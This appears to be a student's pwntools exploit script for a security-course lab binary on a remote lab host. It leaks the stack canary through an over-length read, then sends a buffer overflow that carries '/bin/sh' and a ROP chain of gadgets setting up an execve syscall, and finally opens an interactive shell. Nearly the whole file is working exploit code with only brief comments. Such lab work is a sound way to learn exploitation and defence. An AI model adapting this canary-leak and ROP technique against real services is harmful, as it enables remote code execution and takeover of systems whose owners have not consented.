from pwn import *

# Create the local/remote process
#p = gdb.debug("./lab4-3.bin", """	b *main 
					#b *main+161 
					#gef config context.nb_lines_stack 8""")
p = remote("csc748.hostbin.org", 7043)


# ROP chain
chain = b'AAAAAAAA'
chain += p64(0x48dc6e)		# mov rdi, rsi; ...

chain += p64(0x451fe7) 	# pop rax; ret;
chain += p64(0x3b)		#syscall = 59

chain += p64(0x40f30e) 	# pop rsi; ret
chain += p64(0x0)		# 0

chain += p64(0x4017ef) 	# pop rdx; ret
chain += p64(0x0)

chain += p64(0x4012e3)

				  
prompt = p.recv(1024)
print(prompt.decode())

# Leak the cookie using an offset of 520 plus the 8 bytes of the cookie (528)
p.sendline(b"528:" + b"A"*515 + b"Z"*5)

# Used Z's to make reading in the cookie easier
p.readuntil(b"ZZZZZ")

# Read in the cookie, getting rid of the newline character
cookie = p.recv(8)
cookie = cookie.hex()

# Print the cookie value in Hex
print(cookie)

prompt = p.recv(1024)
print(prompt.decode())

p.sendline(b"536:" + b"/bin/sh\0" + b"A"*512 + p64(int(cookie,16), endian='big', sign="signed") + chain)

p.sendline(b'0')

p.interactive()


